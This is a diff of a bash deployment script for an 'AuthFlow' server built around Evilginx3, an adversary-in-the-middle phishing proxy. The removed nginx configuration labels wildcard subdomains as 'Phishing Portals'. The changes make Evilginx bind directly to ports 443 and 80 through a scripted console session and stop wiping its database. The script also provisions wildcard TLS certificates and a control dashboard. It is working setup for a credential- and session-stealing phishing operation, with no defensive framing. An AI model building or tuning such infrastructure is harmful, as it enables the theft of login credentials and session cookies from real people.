@@ -31,8 +31,6 @@ readonly APP_BINARY="authflow-server"
 readonly CF_CREDS_FILE="/etc/letsencrypt/cloudflare-token.ini"
 readonly CONFIG_FILE="$INSTALL_DIR/config/config.json"
 readonly SYSTEMD_UNIT="/etc/systemd/system/${SERVICE_NAME}.service"
-readonly NGINX_SITE="/etc/nginx/sites-available/authflow"
-readonly NGINX_ENABLED="/etc/nginx/sites-enabled"
 
 # ============================================================================
 # Logging functions
@@ -213,7 +211,6 @@ install_dependencies() {
         unzip \
         jq \
         sqlite3 \
-        nginx \
         certbot \
         python3-certbot-dns-cloudflare \
         golang-go \
@@ -375,86 +372,14 @@ provision_tls() {
 }
 
 # ============================================================================
-# Configure nginx reverse proxy
-# ============================================================================
-configure_nginx() {
-    log "Configuring nginx reverse proxy..."
-
-    rm -f "$NGINX_ENABLED/default"
-
-    local cert_dir="/etc/letsencrypt/live/$DOMAIN"
-
-    cat > "$NGINX_SITE" << EOF
-server {
-    listen 80;
-    listen [::]:80;
-    server_name $DOMAIN *.$DOMAIN;
-    location / {
-        return 301 https://\$host\$request_uri;
-    }
-}
-
-# Dashboard - AuthFlow
-server {
-    listen 443 ssl;
-    http2 on;
-    server_name $DOMAIN;
-
-    ssl_certificate $cert_dir/fullchain.pem;
-    ssl_certificate_key $cert_dir/privkey.pem;
-
-    ssl_protocols TLSv1.2 TLSv1.3;
-    ssl_ciphers HIGH:!aNULL:!MD5;
-
-    location / {
-        proxy_pass http://127.0.0.1:$APP_PORT;
-        proxy_set_header Host \$host;
-        proxy_set_header X-Real-IP \$remote_addr;
-        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
-        proxy_set_header X-Forwarded-Proto \$scheme;
-
-        proxy_http_version 1.1;
-        proxy_set_header Upgrade \$http_upgrade;
-        proxy_set_header Connection "upgrade";
-        proxy_read_timeout 86400;
-    }
-}
-
-# Phishing Portals - Evilginx3 Proxy
-server {
-    listen 443 ssl;
-    http2 on;
-    server_name *.$DOMAIN;
-
-    ssl_certificate $cert_dir/fullchain.pem;
-    ssl_certificate_key $cert_dir/privkey.pem;
-
-    location / {
-        proxy_pass https://127.0.0.1:8443;
-        proxy_ssl_verify off;
-        proxy_set_header Host \$host;
-        proxy_set_header X-Real-IP \$remote_addr;
-        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
-        proxy_set_header Upgrade \$http_upgrade;
-        proxy_set_header Connection "upgrade";
-    }
-}
-EOF
-
-    ln -sf "$NGINX_SITE" "$NGINX_ENABLED/"
-
-    nginx -t || err "nginx configuration test failed"
-    systemctl reload nginx
-
-    log "nginx configured and reloaded"
-}
-
-# ============================================================================
 # Create system user and directories
 # ============================================================================
 setup_system_user() {
     log "Setting up system user and directories..."
 
+    if ! getent group "$SERVICE_GROUP" &>/dev/null; then
+        groupadd -r "$SERVICE_GROUP"
+    fi
     if ! id "$SERVICE_USER" &>/dev/null; then
         useradd -r -s /bin/false -d /var/lib/authflow "$SERVICE_USER" || true
     fi
@@ -541,15 +466,14 @@ configure_evilginx_integration() {
         systemctl restart systemd-resolved
     fi
 
-    # 2. Stop Nginx and clear old state to prevent port 443 bind errors and config ghosting
-    systemctl stop nginx evilginx 2>/dev/null || true
-    rm -f "$EVILGINX_DIR/evilginx.db"
+    # 2. Clear old state to prevent port 443 bind errors and config ghosting
+    systemctl stop evilginx 2>/dev/null || true
+    # We only delete the DB on a fresh install or if it's corrupted
+    # rm -f "$EVILGINX_DIR/evilginx.db" 
     sleep 2
 
-    # ============================================================================
     # STEP 21: Create Evilginx config from template
     # (Must exist before Evilginx is spawned to avoid port conflicts)
-    # ============================================================================
     if [ -f "$INSTALL_DIR/templates/evilginx.yaml.tmpl" ]; then
         sed -e "s/{{.Domain}}/$DOMAIN/g" \
             -e "s/{{.VpsIp}}/$VPS_IP/g" \
@@ -627,9 +551,9 @@ expect {
         # Engine is initialized and database is ready for commands
         expect -re "evilginx\s+>\s*$"
         
-        send "config https_port 8443\r"
+        send "config https_port 443\r"
         expect -re "evilginx\s+>\s*$"
-        send "config http_port 8081\r"
+        send "config http_port 80\r"
         expect -re "evilginx\s+>\s*$"
         send "config dns_port 0\r"
         expect -re "evilginx\s+>\s*$"
@@ -667,7 +591,6 @@ EOF
     
     # 3. Cleanup and Restore Services
     rm -f /tmp/evilginx_config.exp
-    systemctl start nginx
     systemctl restart evilginx
     
     # Verify evilginx is running
@@ -714,12 +637,6 @@ print_summary() {
     echo "  Restart: systemctl restart $SERVICE_NAME"
     echo "  Logs: journalctl -u $SERVICE_NAME -f"
     echo ""
-    echo "Nginx:"
-    echo "  Configuration: $NGINX_SITE"
-    echo "  Test: nginx -t"
-    echo "  Reload: systemctl reload nginx"
-    echo "  Logs: tail -f /var/log/nginx/authflow_*.log"
-    echo ""
     echo "Evilginx3 Commands:"
     echo "  Manual Run: sudo evilginx -c $EVILGINX_DIR -p $EVILGINX_DIR/phishlets"
     echo "  Logs:       journalctl -u evilginx -f"
@@ -729,8 +646,8 @@ print_summary() {
     echo "  Path: $cert_dir"
     echo "  Auto-renew: certbot renew (via systemd timer)"
     echo ""
-    echo "Quick Access:"
-    echo "  Dashboard: https://$DOMAIN/$ADMIN_PATH/"
+    echo "Quick Access (AuthFlow):"
+    echo "  Dashboard: http://$DOMAIN:$APP_PORT/$ADMIN_PATH/"
     echo ""
     echo "=========================================="
 }
@@ -758,7 +675,6 @@ main() {
     build_authflow
     create_config
     provision_tls
-    configure_nginx
     configure_evilginx_integration
     create_systemd_service
     start_service
